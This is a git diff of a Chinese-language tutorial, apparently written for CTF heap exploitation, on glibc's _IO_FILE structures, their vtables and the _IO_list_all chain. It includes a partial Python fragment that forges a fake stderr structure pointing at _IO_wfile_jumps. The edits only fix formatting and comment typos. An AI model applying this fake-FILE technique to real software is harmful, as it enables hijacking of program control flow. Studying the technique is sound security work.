@@ -245,7 +245,7 @@ struct _IO_FILE
 };
 ```
 ##### &emsp;&emsp;&emsp;然后是```_IO_FILE_complete```结构体, 是```_IO_FILE```的加长版, 关注```_wide_data```指针, 和绕过检查有关系
-```C
+```c
 struct _IO_FILE_complete
 {
   struct _IO_FILE _file;
@@ -263,7 +263,7 @@ struct _IO_FILE_complete
 };
 ```
 ##### &emsp;&emsp;&emsp;```_IO_FILE_PLUS```结构体, 在```_IO_FILE```基础上加入一个vtable指针(虚表指针), 虚表指针中存放的是IO相关的操作函数<br>&emsp;&emsp;&emsp;其次, 注意上面源代码中的```#ifdef```宏定义, ```_IO_FILE_PLUS```中的```_IO_FILE```也可以指的是```_IO_FILE_COMPLETE```结构体
-```C
+```c
 struct _IO_FILE_plus
 {
   _IO_FILE file;
@@ -272,7 +272,7 @@ struct _IO_FILE_plus
 ```
 ##### &emsp;&emsp;&emsp;具体是那种结构, 猜测可能与使用的文件open函数有关, 但是没试过. 无论如何, 要伪造的stderr是```_IO_FILE_COMPLETE + vtable``` 的样式<br>&emsp;&emsp;&emsp;此外, 在libc中存在一个指向```_IO_FILE_plus```结构体的```_IO_list_all```指针, 通常情况下指向```_IO_2_1_stderr```, 然后stderr又通过chain指向stdout, stdout指向stdin<br>&emsp;&emsp;&emsp;当出现了新的文件描述符, 会插入到这个链表的头部<br>
 ##### &emsp;&emsp;&emsp;```_IO_jump_t```结构体, 有许多操作函数, 但是不同的```_IO_FILE_PLUS```, 可能会使用不同的虚表, stderr/stdout/stdin使用的是```_IO_file_jumps```
-```C
+```c
 struct _IO_jump_t
 {
     JUMP_FIELD(size_t, __dummy);
@@ -346,13 +346,13 @@ fake_struct += p64(0)                   #_cur_column
 fake_struct += p64(heap_base + 0x200)   #_lock = heap_addr or writeable libc_addr
 fake_struct += p64(0)                   #_offset
 fake_struct += p64(0)                   #_codecvx
-fake_struct += p64(fake_io_addr + 0x30) #_wfile_data rax1
+fake_struct += p64(fake_io_addr + 0x30) #_wide_data rax1
 fake_struct += p64(0)                   #_freers_list
 fake_struct += p64(0)                   #_freers_buf
 fake_struct += p64(0)                   #__pad5
 fake_struct += p32(0)                   #_mode
 fake_struct += b"\x00"*20               #_unused2
-fake_struct += p64(_IO_wfile_jumps + 0x10) #vatable
+fake_struct += p64(_IO_wfile_jumps + 0x10) #vtable
 fake_struct += p64(0)*6                 #padding
 fake_struct += p64(fake_io_addr + 0x40) #rax2
 
